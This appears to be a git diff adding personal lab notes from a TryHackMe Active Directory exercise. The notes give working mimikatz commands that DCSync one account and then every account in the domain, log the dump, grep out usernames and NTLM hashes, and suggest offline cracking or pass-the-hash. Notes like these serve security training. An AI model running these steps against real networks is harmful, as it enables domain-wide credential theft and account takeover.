@@ -1,0 +1,31 @@
+We are using a low privilege user to harvest some creds with mimikatz
+here.
+
+We are doing this to get a domain controller sync for all accounts accross
+the network to see how many credentials we can harvest with this method.
+
+This is great for persistence or just a general exploit, but since its 
+technically harvesting, ive put it into my harvesting directory.
+
+We are generally looking for domain admin's accounts, or anything that
+can bring us up to the next level within this.
+
+C:\Users\Administrator.ZA>C:\Tools\mimikatz_trunk\x64\mimikatz.exe
+
+Start by performing a domain controller sync of our own single account
+within the network:
+lsadump::dcsync /domain:za.tryhackme.loc /user:<Your low-privilege AD Username>
+
+now, here we want to log and sync every account within the network:
+
+log <username>_dcdump.txt 
+
+lsadump::dcsync /domain:za.tryhackme.loc /all
+
+cat <username>_dcdump.txt | grep "SAM Username"
+cat <username>_dcdump.txt | grep "Hash NTLM"
+
+Now with this, we can do a offline password hash crack, or simply do pass
+the hash with mimikatz.
+
+
